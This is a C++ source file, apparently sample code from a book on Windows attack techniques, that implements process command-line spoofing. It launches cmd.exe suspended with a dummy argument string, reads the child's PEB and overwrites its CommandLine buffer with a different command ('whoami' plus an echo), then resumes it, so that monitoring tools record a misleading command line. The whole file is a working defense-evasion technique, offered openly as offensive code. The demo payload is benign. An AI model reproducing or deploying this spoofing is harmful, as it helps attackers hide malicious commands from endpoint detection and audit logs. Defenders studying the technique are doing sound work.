#include <iostream>
#pragma warning (disable : 4996)
/**
 * masqueradeCmdline.cpp
 * 
 * basic idea from:
 * www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb
 *
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
typedef struct _PEB32 {
	UCHAR InheritedAddressSpace;     // +00
	UCHAR ReadImageFileExecOptions;  // +01
	UCHAR BeingDebugged;             // +02
	UCHAR BitField;                  // +03
	ULONG Mutant;                    // +04
	ULONG ImageBaseAddress;          // +08
	_PEB_LDR_DATA * Ldr;             // +0c
	ULONG ProcessParameters;         // +10
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
} PEB32, * PPEB32;



typedef struct m_RTL_USER_PROCESS_PARAMETERS {
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StdInputHandle;
	HANDLE StdOutputHandle;
	HANDLE StdErrorHandle;
	UNICODE_STRING CurrentDirectoryPath;
	HANDLE CurrentDirectoryHandle;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
};

/*void remoteInitUnicodeString(HANDLE hProcess, size_t ptr_sz32bitUnicode, const wchar_t* newString) {
	// try to make RtlInitUnicodeString() for remote process.
	// [memory layout] [WORD: len] [WORD: max_len] [DWORD: ptrToWideString]

	WORD len = lstrlenW(newString) * sizeof(wchar_t);
	WriteProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 0), &len, 2, 0);

	len = (lstrlenW(newString) + 1) * sizeof(wchar_t);
	WriteProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 2), &len, 2, 0);

	LPVOID szUnicodeBuffAt;
	ReadProcessMemory(hProcess, LPVOID(ptr_sz32bitUnicode + 4), &szUnicodeBuffAt, 4, 0);
	//VirtualAllocEx(hProcess, 0, len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//WriteProcessMemory(hProcess, szNewWStringBuf, newString, len, 0);

	WriteProcessMemory(hProcess, szUnicodeBuffAt, newString, len, 0);
}*/

int main(void) {
	PROCESS_INFORMATION PI = {}; STARTUPINFOA SI = {}; CONTEXT CTX = { CONTEXT_FULL };
	m_RTL_USER_PROCESS_PARAMETERS parentParamIn;
	PEB32 remotePeb;

	char dummyInput[MAX_PATH];
	memset(dummyInput, 'A', sizeof(dummyInput));

	wchar_t new_szCmdlineUnicode[] = L"/c whoami & echo P1ay Win32 L!k3 a K!ng. & pause";

	if (CreateProcessA("C:/Windows/SysWOW64/cmd.exe", dummyInput, 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI)) {
		if (GetThreadContext(PI.hThread, &CTX)) {

			ReadProcessMemory(PI.hProcess, LPVOID(CTX.Ebx), &remotePeb, sizeof(remotePeb), 0);
			printf("[+] imagebase at %p\n", remotePeb.ImageBaseAddress);

			auto paramStructAt = LPVOID(remotePeb.ProcessParameters);
			ReadProcessMemory(PI.hProcess, paramStructAt, &parentParamIn, sizeof(parentParamIn), 0);
			
			size_t whereToWrite = (size_t)paramStructAt + offsetof(m_RTL_USER_PROCESS_PARAMETERS, CommandLine);
			WriteProcessMemory(PI.hProcess, parentParamIn.CommandLine.Buffer, new_szCmdlineUnicode, sizeof(new_szCmdlineUnicode), 0);
			// remoteInitUnicodeString(PI.hProcess, whereToWrite, new_szCmdlineUnicode);
			printf("[+] cmdline unicode current at %p\n", whereToWrite);
			
			printf("[+] run...\n\n");
			ResumeThread(PI.hThread);

		}	
	}
	return 0;
}
